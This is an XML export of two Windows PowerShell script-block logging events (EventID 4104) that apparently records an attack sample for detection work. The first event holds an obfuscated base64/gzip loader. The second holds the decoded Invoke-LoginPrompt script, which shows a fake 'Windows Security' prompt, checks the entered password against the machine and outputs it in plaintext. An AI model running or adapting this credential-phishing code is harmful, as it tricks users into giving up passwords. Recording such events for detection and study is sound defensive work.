<root>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
      <EventID>4104</EventID>
      <Version>1</Version>
      <Level>3</Level>
      <Task>2</Task>
      <Opcode>15</Opcode>
      <Keywords>0x0</Keywords>
      <TimeCreated SystemTime="2019-09-09T13:35:08.655802500Z" />
      <EventRecordID>1122</EventRecordID>
      <Correlation ActivityID="{b5abe6c2-675c-0000-aafd-abb55c67d501}" />
      <Execution ProcessID="5500" ThreadID="356" />
      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
      <Computer>MSEDGEWIN10</Computer>
      <Security UserID="S-1-5-21-3461203602-4096304019-2269080069-1000" />
    </System>
    <EventData>
      <Data Name="MessageNumber">1</Data>
      <Data Name="MessageTotal">1</Data>
      <Data Name="ScriptBlockText">&amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAAlVdl0CA81UXW/aMBR996+4svJANJIfgNQHBNs6aaWIsO2hnSbXuaVeEzuyHdKI8d93YwIDTUJlfVkeLPme+3F87lEeay29Mho+6bV5xuSzWSk9t6as/IZF0mIOVxBdG+fTWqU74IOxEwJQeyWKAf+mdG4aBxnK2irf8iHweYHCIVAKWqgdHfJQ4bqECPV61AG5KYXS94e7FiXyIecxi/ZXYsBPcRbtyk6QXYiwx7ooAtJH4B3w+3BGRx0q4VxjbHhfRy79iH6GnkLPR6+L030eG+d5smwrhIQiWD4UbSCXtc5jmU6VRemNbTO0ayXRpWMpTa39jdBihSX1Y9E0o2kzbJLbh5+UfUEtSa+0VJUoJoZEffGDuwuK+5qO/ffR6EbIJ6UxZs2TKnBArNKvolC58Pjn5W7Ag5C0i4NUPIZEI0RLW2O8YUDfv1uEDNcNhaORQ+h9420LYtXt7nVWCUzO2CXgZywT8FfZJmRebJ2u6u32CbP/Mwv1nM4aCE4c9AtM7RNNSCjeMogoUNW+U1NjszfUGWGph8OCKCdmJ8IX2s+M1BzCNOyOjHSQvu/OYLHJluPF8sd8cTt5n2VbtmV///R+A6HMO3IQBQAA'))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))</Data>
      <Data Name="ScriptBlockId">37f6d110-cfdf-4118-8748-17638e258531</Data>
      <Data Name="Path">
      </Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
      <EventID>4104</EventID>
      <Version>1</Version>
      <Level>3</Level>
      <Task>2</Task>
      <Opcode>15</Opcode>
      <Keywords>0x0</Keywords>
      <TimeCreated SystemTime="2019-09-09T13:35:09.315230000Z" />
      <EventRecordID>1123</EventRecordID>
      <Correlation ActivityID="{b5abe6c2-675c-0001-a601-acb55c67d501}" />
      <Execution ProcessID="5500" ThreadID="356" />
      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
      <Computer>MSEDGEWIN10</Computer>
      <Security UserID="S-1-5-21-3461203602-4096304019-2269080069-1000" />
    </System>
    <EventData>
      <Data Name="MessageNumber">1</Data>
      <Data Name="MessageTotal">1</Data>
      <Data Name="ScriptBlockText">function Invoke-LoginPrompt{
$cred = $Host.ui.PromptForCredential("Windows Security", "Please enter user credentials", "$env:userdomain\$env:username","")
$username = "$env:username"
$domain = "$env:userdomain"
$full = "$domain" + "\" + "$username"
$password = $cred.GetNetworkCredential().password
Add-Type -assemblyname System.DirectoryServices.AccountManagement
$DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
while($DS.ValidateCredentials("$full","$password") -ne $True){
    $cred = $Host.ui.PromptForCredential("Windows Security", "Invalid Credentials, Please try again", "$env:userdomain\$env:username","")
    $username = "$env:username"
    $domain = "$env:userdomain"
    $full = "$domain" + "\" + "$username"
    $password = $cred.GetNetworkCredential().password
    Add-Type -assemblyname System.DirectoryServices.AccountManagement
    $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
    $DS.ValidateCredentials("$full", "$password") | out-null
    }
 $output = $newcred = $cred.GetNetworkCredential() | select-object UserName, Domain, Password
 $output
 R{START_PROCESS}
}
Invoke-LoginPrompt</Data>
      <Data Name="ScriptBlockId">c7ca7056-b317-4fff-b796-05d8ef896dcd</Data>
      <Data Name="Path">
      </Data>
    </EventData>
  </Event>
</root>